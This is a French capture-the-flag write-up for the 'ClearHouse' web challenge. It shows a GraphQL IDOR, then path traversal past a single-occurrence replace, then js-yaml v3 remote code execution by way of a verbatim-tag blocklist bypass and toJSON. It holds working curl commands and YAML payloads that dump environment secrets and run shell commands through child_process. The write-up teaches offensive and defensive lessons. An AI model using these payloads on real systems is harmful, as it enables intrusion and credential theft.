# ClearHouse — IDOR GraphQL, path traversal et RCE js-yaml v3 via toJSON

- **Auteur :** lyons

- **Cible :** `http://<HOST>:<PORT>` (gateway Express 4.18.2 / Node 20 placé derrière openresty 1.31.1.1 + service interne report-core)
- **Catégorie :** web
- **Flag :** `CTF{REDACTED}` (cf. la règle de non-persistance des flags)
- **Fichiers fournis :** `server.js` (débarrassé de ses commentaires)

## Cadre

« ClearHouse » est un portail de paiement composé d'un gateway Express offrant GraphQL, d'un
mécanisme de templates et d'un service interne `report-core` (Node + js-yaml v3, démarré via
socat fork — un processus par connexion). Le flag réside dans l'environnement du conteneur
report-core (`FLAG=...`) ; il n'est joignable qu'au terme d'une chaîne de trois
vulnérabilités.

## La chaîne complète (TL;DR)

1. **IDOR GraphQL** : `createPayout(correctsPayoutId:"1")`, puis récupération de
   `corrects { merchant { apiKey } }` → apiKey du compte `ops-internal` (rôle ops)
   obtenue.
2. **Path traversal** : `GET /ops/templates/download` (`name.replace('../','')` n'efface
   qu'une occurrence) → exploitation en lecture de `/app/server.js` et
   `/app/config/internal-secrets.json` → `reportCoreToken`.
3. **RCE js-yaml v3** : `POST /ops/render-report` muni des deux tokens → le service
   report-core applique `JSON.stringify(yaml.load(body))` sur du js-yaml v3 (schéma unsafe).
   La blocklist `!!js/...` est tournée grâce à la forme verbatim du tag YAML ;
   `JSON.stringify` déclenche `toJSON` → code exécuté au moment de la sérialisation →
   dump de `process.env` → flag.

## Étape 1 — IDOR GraphQL jusqu'à l'apiKey du compte ops

En base figure un compte `ops-internal` (rôle `ops`, mot de passe `null` — injoignable via
`/login`) ainsi qu'un payout id `1` dont il est propriétaire.

`createPayout` ingère un `correctsPayoutId` quelconque (la propriété n'est jamais contrôlée)
et le resolver du champ `corrects` invoque `db.getPayoutById(...)` sans vérification
d'appartenance — pendant que le champ `merchant` du payout corrigé livre `apiKey`.

```graphql
mutation($c: String) {
  createPayout(amount: 1, correctsPayoutId: $c) {
    corrects {
      id amount status merchantId
      merchant { id name role apiKey }
    }
  }
}
# variables: {"c": "1"}
```

La réponse obtenue :

```json
{
  "corrects": {
    "merchantId": "ops-internal",
    "merchant": {
      "role": "ops",
      "apiKey": "ck_<hex>"
    }
  }
}
```

→ le `x-api-key` du compte ops est en poche.

## Étape 2 — path traversal jusqu'au reportCoreToken

```js
const name = String(req.query.name || '');
const safe = name.replace('../', '');        // une seule occurrence retirée
const target = path.join(TEMPLATE_DIR, safe);
fs.readFile(target, 'utf8', ...)
```

En préfixant par une série de `../` : un seul disparaît, les suivants grimpent.

```bash
curl -s -G http://<HOST>:<PORT>/ops/templates/download \
  -H 'x-api-key: <ops_key>' \
  --data-urlencode 'name=../../../../../../../app/config/internal-secrets.json'
```

→ `{"reportCoreToken":"<48 hex>"}` (renouvelé à chaque démarrage du conteneur).

### Fichiers extraits grâce à la traversal

| Fichier | Rôle |
|---|---|
| `/app/server.js` | gateway Express : routes `/register`, `/login`, `/graphql`, `/ops/templates/download`, `/ops/render-report` |
| `/app/utils/schema.js` | schéma GraphQL (l'IDOR se niche ici) |
| `/app/utils/db.js` | stockage en mémoire : merchants, payouts, seed ops-internal + payout 1 |
| `/app/utils/auth.js` | sessions gardées dans une Map |
| `/app/config/internal-secrets.json` | `reportCoreToken` |

## Étape 3 — report-core : d'un écho YAML au RCE

### Comportement cartographié (observations)

`POST /ops/render-report` transfère le corps brut (longueur sur 4 octets en BE) vers
report-core (réseau interne, jamais atteignable directement depuis Internet).

| Entrée | Réponse |
|---|---|
| doc YAML scalaire ou mapping | `200` + `JSON.stringify(yaml.load(body))` |
| document vide | `200` + `undefined` |
| erreur de parse ou tableau racine | `400` + `invalid template` |
| tag `!!js/...` | `400` + `rejected: disallowed tag` |
| structure cyclique (ancre récursive) | `502` + `internal error` |

Deux enseignements décisifs :

- la sortie émane de `JSON.stringify()` (ce qui explique `undefined` pour un document vide) ;
- un filtre de tags existe — donc le service repose sur un js-yaml apte à fabriquer des
  types JS (`!!js/function`, `!!js/regexp`), autrement dit **js-yaml v3, schéma unsafe par
  défaut**, auquel l'auteur a ajouté une blocklist.

### Tourner la blocklist de tags

La blocklist repère la forme littérale `!!js/...`. YAML autorise pourtant d'écrire ce même
tag en **forme verbatim** (URI complète) :

```yaml
!<tag:yaml.org,2002:js/function> "function(){ ... }"
```

Validé hors-ligne avec js-yaml@3.15.2 : le tag est bien résolu et la fonction est
effectivement construite.

### De la fonction fabriquée à son exécution : toJSON

Une fonction fabriquée ne s'exécute pas d'elle-même ; toutefois `JSON.stringify` invoque
`toJSON()` sur tout objet qui en est doté. Comme js-yaml produit des fonctions JS, il suffit
de soumettre un objet dont la propriété `toJSON` est une fonction → celle-ci est **appelée
pendant la sérialisation**.

```yaml
a:
  toJSON: !<tag:yaml.org,2002:js/function> >-
    function(){ return JSON.stringify(process.env) }
```

### Payload retenu

```yaml
a:
  toJSON: !<tag:yaml.org,2002:js/function> >-
    function(){
      try { return JSON.stringify(process.env) }
      catch(e) { return 'ERR='+e.message }
    }
```

```bash
curl -s -X POST http://<HOST>:<PORT>/ops/render-report \
  -H 'Content-Type: text/plain' \
  -H 'x-api-key: <ops_key>' \
  -H 'x-report-core-token: <reportCoreToken>' \
  --data-binary @payload.yaml
```

Ce que renvoie le service (extrait) :

```json
{"a":"{ ... \"FLAG\":\"CTF{REDACTED}\", ... }"}
```

### Preuve d'un RCE complet

```yaml
a:
  toJSON: !<tag:yaml.org,2002:js/function> >-
    function(){
      var cp = process.mainModule.require('child_process');
      return cp.execSync('id; env', {encoding:'utf8', timeout:6000});
    }
```

→ `uid=0(root) gid=0(root)` — report-core tourne en root dans son conteneur et le flag loge
dans ses variables d'environnement.

Précision : `new Function(...)` n'expose pas `require` dans sa portée ; il faut passer par
`process.mainModule.require('child_process')` (opérant dans un script CJS Node 20).

## Résultat obtenu

```
CTF{REDACTED}
```

Le flag a été lu dans la variable d'environnement `FLAG` du conteneur report-core.

## Contraintes de temps

Rate limit en mode « focus » : 5 requêtes / 10 min sur `/ops/render-report` (bucket keyé sur
`req.ip`, sans trust proxy ⇒ partagé via le proxy). Les essais sont donc comptés — chaque
payload doit être éprouvé hors-ligne avant tout envoi.

## Chausse-trapes du challenge

- **~8 h de « shape guessing »** sur le rendu des templates (structure
  `{template, data, name}`, placeholders `{{...}}` / `<%= %>`, noms de templates,
  chemins…) alors que le service ne rendait strictement rien. L'indice qui a tout débloqué
  concernait le tag YAML, non la structure du document. Face à un service qui « ne rend
  jamais », songer sérialisation/parsing plutôt que moteur de template.
- **`JSON.stringify(undefined)` → `undefined`** comme
  `Converting circular structure to JSON` → `502 internal error` trahissent une sortie
  traversant `JSON.stringify`. À la moindre de ces signatures, songer à `toJSON` : un point
  d'exécution offert gratuitement par la sérialisation.
- **Le challenge a été patché en cours de CTF** (sweeps mémoire 24 h dans `db.js`/`auth.js`,
  ajout de `sweepExpiredSessions`). Relire systématiquement la source live par la faille et
  se garder des sessions/API keys qui « sautent » après un redéploiement.
- **`name.replace('../','')` n'efface qu'une occurrence** → `"../" * 9 + chemin` continue de
  traverser.

## Enseignements

1. **Une blocklist de tags YAML se franchit par la forme verbatim** :
   `!<tag:yaml.org,2002:js/function>` plutôt que `!!js/function`. Filtrer sur `!!js/` n'apporte
   aucune protection.
2. **js-yaml v3 = unsafe par défaut** (`yaml.load` admet `!!js/function`, `!!js/regexp`). Le
   message maison `rejected: disallowed tag` dénonce l'existence du filtre… donc celle du
   danger qui le motive.
3. **Des messages d'erreur différenciés dessinent la carte du code** : `invalid template`
   (parse/array), `rejected: disallowed tag` (filtre), `internal error` (catch générique) →
   trois branches, trois pistes à explorer.
4. **IDOR GraphQL au niveau du champ** : l'appartenance n'est parfois contrôlée que sur la
   requête racine (`payout(id)`), pas sur un resolver de champ
   (`corrects → merchant.apiKey`). Tester sans relâche les champs « relations ».
5. **Path traversal face à un replace naïf** : `name.replace('../','')` n'efface qu'une seule
   occurrence. Éprouver toujours avec des occurrences répétées.

---

*Rédaction : **lyons** — BUG|PWN CTF · ClearHouse.*
